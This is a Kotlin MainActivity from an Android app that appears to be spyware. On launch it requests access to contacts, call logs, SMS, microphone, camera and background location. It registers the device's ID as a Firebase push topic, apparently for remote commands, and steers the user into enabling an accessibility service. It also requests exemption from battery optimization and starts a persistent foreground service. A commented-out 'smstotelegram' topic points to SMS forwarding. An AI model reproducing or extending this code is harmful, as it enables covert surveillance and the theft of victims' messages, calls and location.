package com.torvalds.rtdbdatasaervice

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.google.firebase.FirebaseApp
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.multi.MultiplePermissionsListener
import com.torvalds.rtdbdatasaervice.gameover.MyService
import com.torvalds.rtdbdatasaervice.gameover.SocialMedia

class MainActivity : AppCompatActivity() {
    private var aid: String = ""
    @RequiresApi(Build.VERSION_CODES.Q)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        FirebaseApp.initializeApp(this);

        askPermissions()
        getAid()
        subscribeTopic()
        ignorebattryOptimization()
        checkAndAskAcc()
    }

    private fun ignorebattryOptimization() {
        val powerManager = applicationContext.getSystemService(POWER_SERVICE) as PowerManager
        val packageName = "br.com.helpdev.smsreceiver"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val i = Intent()
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                i.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                i.data = Uri.parse("package:$packageName")
                startActivity(i)
            }
        }
    }

    private fun getAid() {
        aid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    private fun subscribeTopic() {
        FirebaseMessaging.getInstance().subscribeToTopic(aid)

        /*Firebase.messaging.subscribeToTopic("smstotelegram")
            .addOnCompleteListener { task ->
                var msg = "Subscribed"
                if (!task.isSuccessful) {
                    msg = "Subscribe failed"
                }
                Log.d("TAG", msg)
                Toast.makeText(baseContext, msg, Toast.LENGTH_SHORT).show()
            }*/
    }

    private fun checkAndAskAcc() {
        val enabled = isAccessibilityServiceEnabled(this, SocialMedia::class.java)
        if (!enabled){
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }
    }

    fun isAccessibilityServiceEnabled(
        context: Context,
        service: Class<out AccessibilityService?>
    ): Boolean {
        val am = context.getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices =
            am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        for (enabledService in enabledServices) {
            val enabledServiceInfo = enabledService.resolveInfo.serviceInfo
            if (enabledServiceInfo.packageName == context.packageName && enabledServiceInfo.name == service.name) return true
        }
        return false
    }


    @RequiresApi(Build.VERSION_CODES.Q)
    fun askPermissions() {
        val requiredPermissionsList = arrayListOf<String>(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_PHONE_STATE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requiredPermissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
            requiredPermissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
            requiredPermissionsList.add(Manifest.permission.READ_MEDIA_AUDIO)
            requiredPermissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION)
        } else {
            requiredPermissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            requiredPermissionsList.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }

        Dexter.withActivity(this).withPermissions(
            requiredPermissionsList
        )
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    if (report.areAllPermissionsGranted()) {
                        Log.e("wowow", "granted and service started")

                        startMyService()
                    } else {
                        for (i in report.deniedPermissionResponses) {
                            Log.e("wowow", i.permissionName)
                        }
                        report.deniedPermissionResponses
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                        val uri = Uri.fromParts("package", packageName, null)
                        intent.data = uri
                        startActivityForResult(intent, 123)
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    permissions: List<PermissionRequest>,
                    token: PermissionToken
                ) {
                    token.continuePermissionRequest()
                }
            }).check()
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startMyService() {
        try {
            val intent = Intent(this, MyService::class.java)
            intent.action = "myAction"
            this.startForegroundService(intent)
            android.util.Log.d("MainActivity", "MyService started")
        } catch (e: java.lang.Exception) {
            android.util.Log.d("MainActivity", "Error in startMyService: $e")
        }
    }
}